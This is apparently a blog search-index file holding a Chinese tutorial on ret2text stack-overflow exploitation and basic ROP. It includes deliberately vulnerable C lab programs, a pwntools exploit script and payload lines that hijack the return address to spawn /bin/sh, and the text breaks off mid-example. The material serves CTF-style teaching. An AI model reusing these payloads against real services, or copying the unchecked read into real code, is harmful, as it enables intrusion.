<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ret2_text</title>
      <link href="/2023/02/02/ret2-text/"/>
      <url>/2023/02/02/ret2-text/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h1 id="ret2-text基础">ret2_text基础</h1><blockquote><p>当程序本身存在自带‘/bin/sh’的后门函数，且有明显栈溢出时可用ret2_text,例：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> sh[]=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">char</span> *cmd)</span>&#123;</span><br><span class="line">system(sh);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dofunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> b[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>,b,<span class="number">0x100</span>);</span><br><span class="line"><span class="comment">//printf(b);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    dofunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="做题基本步骤：">做题基本步骤：</h2><ol><li><p>运行程序观察程序大概是干什么的</p><ol start="2"><li>checksec检查保护，和程序的基本信息（i386/x86_64等等）</li><li>IDA Pro反编译程序，</li><li>GDB 动态调试寻找漏洞</li><li>根据IDA+GDB编写exploit</li><li>在本地运行攻击程序，再远程攻击</li></ol></li></ol><h2 id="函数调用时寄存器的变化-esp-ebp">函数调用时寄存器的变化（esp，ebp）</h2><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230202152005.png" alt=""></p><p>将执行中程序理解为这四部分：</p><ul><li><p>text部分：是自己写的代码，代码段</p></li><li><p>heap： 堆区，（malloc申请的空间）</p></li><li><p>外部函数：动态链接库之类的，不是程序本身就有的（动态链接类程序）</p></li><li><p>stack：栈，ret2text主要依靠制造栈溢出来改变程序的执行流</p></li></ul><h2 id="函数调用时基本示意图-x86">函数调用时基本示意图(x86)</h2><h3 id="入栈">入栈</h3><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230202163824.png" alt=""></p><p>以上方为低地址:</p><blockquote><p>push eip : 先将esp减4,(esp向上移动)再将eip的值放入新的esp所指向的位置</p><p>push ebp : 同上</p><p>sub esp,0x20 : 为该函数开辟空间</p></blockquote><p>此时,在栈上,就成了这个模样</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230202162202.png" alt=""></p><p>此时,在此函数内,如果存在没有边界检查(或存在可以接收超过开辟的空间的大小的数据)的输入函数时,就有可能将eip的值覆盖掉,变成我们想要的函数的地址</p><h3 id="出栈">出栈</h3><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/202302021621037.png" alt="202302021621037"></p><p>以上方为低地址:</p><blockquote><p>leave:</p><ul><li>mov esp,ebp: 将ebp的值赋值给esp,esp就下降到和ebp相同的位置</li><li>pop ebp: 因为ebp的值指向的是之前ebp的值,所以ebp返回原来的地址,esp加4,到0xffffaac8,指向入栈时eip所指向的值</li></ul><p>ret:</p><ul><li>pop eip: eip获得原来的值,esp再加4,回到入栈的起始位置</li></ul></blockquote><p><font size='5'>由此我们就可以发现，这个出栈的过程中，函数出栈前的esp到ebp中存储的数据不会清除，出函数后可能仍会在栈中保存这个函数运行所产生的数据。</font></p><p>但最后esp和ebp的关系总体还是这样:</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230202162826.png" alt=""></p><h2 id="例1">例1:</h2><p>这就是上面的源代码,用gcc编译成32位程序(没有开地址随机化):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> sh[]=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">char</span> *cmd)</span>&#123;</span><br><span class="line">system(sh);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dofunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> b[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>,b,<span class="number">0x100</span>);</span><br><span class="line"><span class="comment">//printf(b);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    dofunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再用ida反编译一下</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230202170046.png" alt=""></p><p>明显可以看到,dufunc中的read函数(gets,scanf的底层函数,就是接收用户输入)可以接收0x100个字符,但buf到ebp的距离只有0x10</p><p>画个图理解一下这个函数的栈空间:</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230202170700.png" alt=""></p><p>当read函数接收用户写入的东西时,会写入buf的地址,并依次由低地址写向高地址,直到用户输入结束或者超过向read函数传入的第三个参数的大小(此题就是0x100),但此题中,buf到ebp的距离只有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mi>x</mi><mi>f</mi><mi>f</mi><mi>f</mi><mi>f</mi><mi>a</mi><mi>a</mi><mi>c</mi><mi>c</mi><mo>−</mo><mn>0</mn><mi>x</mi><mi>f</mi><mi>f</mi><mi>f</mi><mi>f</mi><mi>a</mi><mi>a</mi><mi>b</mi><mi>c</mi><mo>=</mo><mn>0</mn><mi>x</mi><mn>10</mn></mrow><annotation encoding="application/x-tex">0xffffaacc-0xffffaabc=0x10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.10764em;">ffff</span><span class="mord mathnormal">aa</span><span class="mord mathnormal">cc</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.10764em;">ffff</span><span class="mord mathnormal">aab</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">10</span></span></span></span>个字节(实际数值应由gdb动态调试得到)</p><p>所以当我们输入的数据多余0x10个时,就可以改掉ebp中的值,但是此题中改掉ebp中的值对程序的执行过程没有一点作用.但是ebp下面的返回地址就可以改变程序的执行过程(ret 时会pop 这个地方的值给eip),如果我们在这个地方填上我们想要执行的函数的地址,就可以使eip直接去执行我们想要的地址.</p><p>在IDA中看到存在调用system函数的的函数地址为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mi>x</mi><mn>08049182</mn></mrow><annotation encoding="application/x-tex">0x08049182</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">08049182</span></span></span></span></p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230202172412.png" alt=""></p><p>因为没有开地址随机化,于是可以直接编写exploit:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">pwnfile= <span class="string">&#x27;./question_4_1_x86&#x27;</span></span><br><span class="line">io = process(pwnfile)</span><br><span class="line"><span class="comment">#io = remote(&#x27;&#x27;, ) 远程题用这一行做</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x14</span>    <span class="comment">#通过调试得到 </span></span><br><span class="line"><span class="comment">#0x10覆盖ebp再加0x4(32位)完全覆盖ebp到达返hui</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io) <span class="comment"># gdb附加调试</span></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">return_addr = <span class="number">0x08049182</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*padding + p32(return_addr)  <span class="comment"># p32(),将return_addr转化成机器可识别的地址(因为程序是小端序,不能直接输入0x08049182)</span></span><br><span class="line"><span class="comment">#payload = flat([&#x27;a&#x27;*padding, return_addr])</span></span><br><span class="line">delimiter = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delimiter, payload)  <span class="comment"># 在接收了delimiter再发送payload</span></span><br><span class="line">io.interactive() <span class="comment"># 启动交互,如果得到了shell,就可以正常使用,否则会返回EOF</span></span><br></pre></td></tr></table></figure><h2 id="函数的传参-32位-cdecl">函数的传参（32位，__cdecl）</h2><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203161435.png" alt=""></p><p>如图：</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203162321.png" alt=""></p><table><tr><td bgcolor=PowderBlue><label style="color:blue">__cdecal : C/C++默认方式，参数从右向左入栈，主调函数负责栈平衡。</label> </td></tr></table><blockquote><p>1.push 参数3 使参数3先入栈（esp-4指向下一位置）</p><p>2.push 参数2</p><p>3.push 参数1</p><p>4.call func 后面就是上面说的调用函数了</p></blockquote><p>根据这个很容易就知道，当<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>&gt;</mo><mn>0</mn><mo separator="true">,</mo><mi>X</mi><mo>∈</mo><mi>R</mi></mrow><annotation encoding="application/x-tex">X&gt;0,X\in R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span>时：</p><ul><li>rbp+x 为外部函数传给当前函数的参数  （图中ebp下面的位置）</li><li>rbp-x 为函数内部自己的参数     （图中ebp上面的位置）</li></ul><p>但是，我们布栈不能这么布，下面一个程序会便于理解</p><h2 id="例2：">例2：</h2><p>程序代码如图，gcc 编译，不开地址随机化，编译成32位程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> sh[]=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">char</span> *cmd)</span>&#123;</span><br><span class="line">system(cmd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dofunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> b[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>,b,<span class="number">0x100</span>);</span><br><span class="line"><span class="comment">//printf(b);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    dofunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个代码就可以看到，存在system（）函数，也存在“/bin/sh”字符串，但system函数没有参数，无法直接靠运行到func函数来取得shell，所以要对func（）函数传参或直接传参给system（）</p><p>根据上面的传参规则：</p><p>我们第一步可以想到这样布栈：</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203174559.png" alt=""></p><p>于是，我们将编译好的程序丢到IDA中静态看一看，可以发现在func函数中：</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203170226.png" alt=""></p><p>buf变量IDA算出（可能不准）到我们要的ebp只有0x10个字节的长度，而read（）函数对读入字符个数的限制为0x100，我们就可以构造栈溢出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(func_addr)+p32(bin_sh_addr)</span><br></pre></td></tr></table></figure><p>但我们这样写的payload是对的吗？</p><p>拿到ubuntu上用gdb调试一下：</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203171947.png" alt=""></p><p>到这里你似乎会觉得这个payload没有问题，我们继续往下走，进入到我们布置好的栈中：</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203172108.png" alt=""></p><p>知道开始调用system（）函数后，你才发现，system（）的参数居然是个0xa（‘\n’）！，所以我们的payload其实有问题，但问题在哪呢？</p><p>函数出栈时会经历</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leave  ; mov esp,ebp ; pop ebp</span><br><span class="line">ret;pop eip</span><br></pre></td></tr></table></figure><p>因为ret，会直接进入到我们所布置到的func函数中，然后进入函数就又会进行这几个语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push   ebp</span><br><span class="line">mov    ebp,esp</span><br><span class="line">sub    esp,0x10</span><br></pre></td></tr></table></figure><p>此时画图分析，栈上的结构就成了这样</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203174634.png" alt=""></p><p>此时，我们的“/bin/sh”字符串就被当成了返回地址，而后面输入的‘\n’（0xa）就被当成了参数</p><p>所以，我们应该这样写：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>x0x14 +p32(func_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_sh_addr)   <span class="comment"># 0xdeadbeef为无用字节或者直接写成出func（）函数后的下一个函数的地址</span></span><br></pre></td></tr></table></figure><p>就应该这样子去布栈</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203175501.png" alt=""></p><h2 id="函数的传参-64位-cdecl-gcc编译程序">函数的传参（64位，__cdecl）（gcc编译程序）</h2><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203181040.png" alt=""></p><p>有了32位程序的基础，如果我们要对64位程序传参，我们可以将参数先布置在栈中，然后让程序执行pop rdi/rsi/rdx的代码，使我们布置在栈中的数据能够存放在这几个寄存器中（参数小于6个）</p><p>但是这样子怎么才能做到呢？<img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203182555.png" alt=""></p><h2 id="rop编程-简单使用">ROP编程（简单使用）</h2><h3 id="指令集的拆分">指令集的拆分</h3><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203183849.png" alt=""></p><p>看这个函数</p><blockquote><p>pop rbp 左边的机械码是5D</p><p>pop r13 左边的机械码是 41 5D</p></blockquote><p>这张图片把他们的地址展示了出来</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203184241.png" alt=""></p><blockquote><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mi>x</mi><mn>0000000000401206</mn><mo>−</mo><mn>0</mn><mi>x</mi><mn>0000000000401204</mn><mo>=</mo><mn>0</mn><mi>x</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">0x0000000000401206-0x0000000000401204=0x2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">0000000000401206</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">0000000000401204</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">2</span></span></span></span>   pop_r13_addr-pop_r12_addr</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mi>x</mi><mn>0000000000401204</mn><mo>−</mo><mn>0</mn><mi>x</mi><mn>0000000000401203</mn><mo>=</mo><mn>0</mn><mi>x</mi><mn>1</mn></mrow><annotation encoding="application/x-tex">0x0000000000401204-0x0000000000401203=0x1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">0000000000401204</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">0000000000401203</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">1</span></span></span></span>   pop_r12_addr-pop_rbp_addr</p></blockquote><p>明显，这两个的代码长度不同，所以我们可以对长的机械码拆分</p><p>拆分成我们想要的地址</p><p>但是我们不可能自己一直看机械码进行拆分，所以进行这个时候我们就能用一个工具：</p><table><tr><td bgcolor=PowderBlue><label style="color:blue">ROPgadget</label> </td></tr></table><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary &#123;file&#125; &gt; gadget <span class="comment"># 将所有可用的gadget输出到名为gadget的文本中</span></span><br><span class="line">ROPgadget --binary &#123;file&#125; &gt; gadget --only <span class="string">&quot;pop|ret&quot;</span></span><br></pre></td></tr></table></figure><p>使用“ROPgadget --binary {file} &gt; gadget”命令，可以看到有很多很多的gadget</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203190149.png" alt=""></p><p>但是使用“--only “pop |ret””加了限制条件后，就能找到自己想要的</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203190318.png" alt=""></p><p>由此，我们就能倒回去解决刚刚的那个问题，我们可以将返回地址布置成pop_rdi_ret_addr再布置rdi的值入栈：</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203190850.png" alt=""></p><p>所以payload格式应该为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>* padding + p64(pop_rdi_ret_addr) + p64(bin_sh_addr) + p64(return_addr)</span><br><span class="line"><span class="comment"># padding为溢出的个数（输出多少个无用的a）</span></span><br></pre></td></tr></table></figure><h2 id="例3：">例3：</h2><p>编译成32位程序，关闭地址随机化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> sh[]=<span class="string">&quot;/bbbbbbbbbbbbbbbbbbin/sh&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">char</span> *cmd)</span>&#123;</span><br><span class="line">system(cmd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dofunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> b[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>,b,<span class="number">0x1c</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    dofunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先最明显的是“/bin/sh”变成了“/bbbbbbbbbbbbbbbbbbin/sh”</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203193051.png" alt=""></p><p>因为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh == /bin/sh</span><br></pre></td></tr></table></figure><p>而且有了指令集拆分的经历，我们可以点进去查看这串字符串的地址</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203193258.png" alt=""></p><p>于是，我们就可以把<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mi>x</mi><mn>0804</mn><mi>C</mi><mn>03</mn><mi>A</mi></mrow><annotation encoding="application/x-tex">0x0804C03A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">0804</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord">03</span><span class="mord mathnormal">A</span></span></span></span>做为sh的地址</p><p>其次，进入do_func（），看到buf离rbp有0x10个字符，我们要造成溢出至少需要0x14个字符，但是read（）函数限制读入0x1c个字符（要经过gdb验证这些数据）</p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203193623.png" alt=""></p><p>所以，给我们输入地址的位置只有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mi>x</mi><mn>1</mn><mi>c</mi><mo>−</mo><mn>0</mn><mi>x</mi><mn>10</mn><mo>=</mo><mn>0</mn><mi>x</mi><mn>8</mn></mrow><annotation encoding="application/x-tex">0x1c-0x10=0x8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">1</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">10</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">8</span></span></span></span></p><p>我们之前的payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(func_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_sh_addr)</span><br></pre></td></tr></table></figure><p>因为这是32位程序，我们后面三个必须要舍弃一个，但直接舍弃就会发生我们之前的错误该怎么办呢？</p><p>回到我们的函数调用：</p><p>最开始会经历这两个步骤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push   ebp</span><br><span class="line">mov    